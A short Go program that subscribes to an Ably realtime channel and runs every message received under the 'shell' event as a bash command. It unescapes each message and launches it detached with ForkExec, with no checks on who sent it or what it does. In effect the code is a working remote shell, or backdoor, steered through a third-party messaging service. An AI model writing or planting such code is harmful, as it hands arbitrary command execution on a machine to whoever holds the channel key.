package main

import (
	"context"
	"fmt"
	"html"
	"os"
	"syscall"

	"github.com/ably/ably-go/ably"
)

func main() {
	client, err := ably.NewRealtime(ably.WithKey("sex"))
	if err != nil {
		panic(err)
	}
	channel := client.Channels.Get("cvm")

	ctx := context.Background()
	_, err = channel.Subscribe(ctx, "shell", func(msg *ably.Message) {
		fmt.Printf("Received command: %s\n", msg.Data)

		cmd, ok := msg.Data.(string)
		if !ok {
			fmt.Printf("Error: %s\n", err)
			return
		}

		real := html.UnescapeString(cmd)

		/*command := exec.Command("bash", "-c", real)
		command.Env = os.Environ()
		command.Stdin = os.Stdin
		command.Stdout = os.Stdout
		command.Stderr = os.Stderr

		err = command.Start()
		if err != nil {
			fmt.Printf("Error2: %s\n", err)
			return
		}*/
		var args = make([]string, 3)
		args[0] = "/bin/bash"
		args[1] = "-c"
		args[2] = real
		var sysProcAttr = syscall.SysProcAttr{}
		sysProcAttr.Setsid = true
		var procAttr = syscall.ProcAttr{
			"/home/dartz",
			os.Environ(),
			nil,
			&sysProcAttr,
		}
		syscall.ForkExec("/bin/bash", args, &procAttr)
	})
	if err != nil {
		// Handle err
		panic(err)
	}

	select {}
}
